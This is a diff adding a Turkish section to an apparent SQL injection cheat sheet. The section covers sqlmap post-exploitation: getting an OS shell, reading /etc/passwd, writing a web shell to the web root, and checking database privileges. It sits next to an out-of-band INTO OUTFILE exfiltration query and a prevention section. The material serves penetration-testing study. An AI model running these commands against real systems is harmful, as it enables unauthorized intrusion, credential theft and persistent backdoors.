@@ -434,6 +434,36 @@ SELECT YOUR-QUERY-HERE
 INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a';
 ```
 
+# SQL Injection Sonrası Yetki Yükseltme & Post-Exploitation (sqlmap)
+## Komut Çalıştırma
+Eğer SQL Injection, veritabanı üzerinden sistem komutu çalıştırmaya izin veriyorsa (xp_cmdshell, COPY TO PROGRAM, sys_exec() gibi fonksiyonlar açık ise), sqlmap bunu otomatik tespit edip sana shell verebilir.
+```bash
+sqlmap -u "http://example.com/blog?id=1" --os-shell
+```
+- sqlmap, DBMS üzerinde komut çalıştırabilecek uygun fonksiyonu bulursa etkileşimli shell verir.
+
+## Dosya Okuma
+Veritabanının dosya sistemi erişimi varsa sqlmap ile direkt olarak hedef sunucudaki dosyaları okuyabilirsin:
+```bash
+sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/passwd"
+```
+Bu, web server yapılandırması, credential dosyaları veya kod incelemesi için kullanılır.
+
+## Dosya Yazma
+Sunucuya dosya yükleyip web shell bırakmak için kullanılabilir.
+```bash
+sqlmap -u "http://target.com/vuln.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+```
+- shell.php kendi sisteminde hazır olmalı.
+- --file-dest sunucuda yazılacak tam yolu belirtir.
+
+### Kullanıcı Yetkilerini Görme
+Bu işlemler için veritabanı kullanıcı yetkilerini kontrol etmek önemli.
+```bash
+sqlmap -u "http://target.com/vuln.php?id=1" --privileges --current-user
+```
+- Çıktıda FILE, SUPER, EXECUTE gibi yetkiler varsa file read/write ve command execution ihtimali artar.
+
 # SQL Injection Önleme Yöntemleri
 Parametrik Sorgular (Prepared Statements) Kullan
 - Kullanıcı girdisini SQL sorgusunun bir parçası olarak birleştirme. Bunun yerine sorguyu ve parametreleri ayrı gönder.
